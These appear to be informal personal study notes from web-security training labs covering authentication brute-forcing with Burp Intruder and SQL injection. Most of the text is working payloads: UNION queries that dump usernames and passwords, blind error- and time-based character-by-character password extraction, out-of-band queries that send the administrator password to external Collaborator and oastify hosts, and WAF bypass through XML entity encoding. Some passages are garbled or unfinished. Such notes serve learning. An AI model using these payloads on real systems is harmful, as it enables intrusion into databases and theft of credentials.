

**Authentication Vulnerabilities:**

username: apps

 

For finding the username we use burp intruder and then make another column using grep-extract named invalid username or password some input would give no output it would be our username then do the same but without this grep

The 302 would be our password



There are Vulnerabilities such as

-> MFA how we can use the cookie from our session and log into another account

-> How we can use Burp Intruder to guess the password using length of the response received the largest response would be the username then we could just look at the status code for password



Lab 36:

-> We realize that the hash created is a mix of the following

 	username:md5hash of the password and base64 encoding of the whole

->So using burp intruder we first do payload configuration using first

 	-> hash:md5

 	->username:

 	->encode base64

there would be only



-> We can also use SQL Injection union attack to access other tables

For this to work first we need to find the no of columns a table might contain on the sql database so we could use a NULL column request in some parameter that talks to the sql database

So we use '+UNION+SELECT+NULL,NULL--

depends on when the server returns with OK

we keep adding no of columns

-> Different databases use diff comments

like oracle or Microsoft



-> If we want to return some random value using the union and null we could just replace the null with 'abcdef' string and try each of em



-> || is used as a pipe operator to concatenate the strings rather than two columns

This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

'+UNION+SELECT+username||'~'||password+FROM+users--



***Always check which column can take inputted string***

-> # can also be used as a comment if -- appears to be a failure



Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.



For example, you can query information\_schema.tables to list the tables in the database:



SELECT \* FROM information\_schema.tables





'+UNION+SELECT+column\_name,+NULL+FROM+information\_schema.columns+WHERE+table\_name=--







'+UNION+SELECT+column\_name,+NULL+FROM+information\_schema.columns+WHERE+table\_name=--





-> Try LAB 31 again



-> Lab 34 or smthg

in this lab we would attempt to find errors using blind sql injection ie

we would check if the request is being processed by the backend database or not so that we can inject our own queries



To check the version of a database we just inject this into the vulnerability

'+UNION+SELECT+banner,NULL+FROM+v$version+WHERE+ROWNUM=1--



to check which syntax to use we try out all the syntax the ones that show ok must be our like in this case

'||(SELECT '' FROM dual)||' dual is used for oracle so this must be oracle database



'||(SELECT '' FROM users where ROWNUM=1)||'

check whether our users table exist or not using the rownum function which returns true if it has one row





'||(SELECT CASE WHEN (1=2) THEN TO\_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

this is the case condition we use to check whether a certain entity exists in our table or not

if 1=1 then case would cause an error cause of 1/0

else it would check if our administrator username exists or not



'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO\_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

this condition would check whether our password is greater than 1 or not if it is it would return error as 1/0 is not possible



using intruder on the password >1 we find that length is not more than 19 characters



then we use '||(SELECT CASE WHEN SUBSTR(password,pos,1)='a' THEN TO\_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

then we put payload on a and 1

'||(SELECT CASE WHEN SUBSTR(password,$pos$,1)='$a$' THEN TO\_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'



password: mwsok43z798m6ja0te72





**->34**

**You can use the CAST() function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:**



**CAST((SELECT example\_column FROM example\_table) AS int)**

**Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:**



**ERROR: invalid input syntax for type integer: "Example data"**

**This type of query may also be useful if a character limit prevents you from triggering conditional responses.**



->Lab 36

uses a cookie tracking that we can use to check whether conditional statements are valid or not

so to confirm that injection is possible we use cast instead of case

-> mainly case is used for mapping out the entire password



TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--

THis would return AND 1

which is invalid syntax as cast would give 1

so we do

TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--



The error that comes now is that the Whole query is not being sent because of the character limit so we delete some of the tracking id to send the query

we then change the query to LIMIT 1 so that only one row is shown with the tracking id fully gone

We notice that the first row is administrator so we modify it by passwords



**-> TIME DELAYS**

**we could test if a database takes more time to respond as conditional statements would not work here**

**'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--**



**using this**



%3B represents a ';'



Lgg6Gm7OWCSA6tUP -> tracking cookie



'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg\_sleep(10)+ELSE+pg\_sleep(0)+END+FROM+users--



using this condition we see that the server takes 10 seconds to respond so the username ='administrator' exists



***Exploiting blind SQL injection using out-of-band (OAST) techniques***



->An application might carry out the same SQL query as the previous example            but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.



for these kind of queries we use BURP COLLABORATOR

%27 -> '

%3f -> ?

%3d -> =

%25 -> %

%3A -> :
%3c -> <

'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp\_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

this technique helps us extract password from an OAST database


**-> Lab 46:**

this lab explores the collaborator functions which uses asynchronous ie two threads submit the user's information one to sql one to the user so we put the collaborator id in our payload which is configured for **ORACLE** right now





&nbsp;(x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+\[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.r0s9orc8utjqhy1z2x69fy30mrsig94y.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--)



In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.



These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:



<stockCheck>

&nbsp;   <productId>123</productId>

&nbsp;   <storeId>999 \&#x53;ELECT \* FROM information\_schema.tables</storeId>

</stockCheck>



WE use burp interpreter for this 

we exploit xml injection for this and use encoding instead of 's' to access the database



In Lab 48

we use hackverter which is essentially an extension of burp suite to encoding or to bypass a web firewall so that our query can be executed without any detection by the firewall 

we simply encode with @dec\_entities and enclose the query within it 

but there is only one column so we return the concatenated usernames and passwords



We could prevent SQL injection by simply treating the injected input as data and not some query 





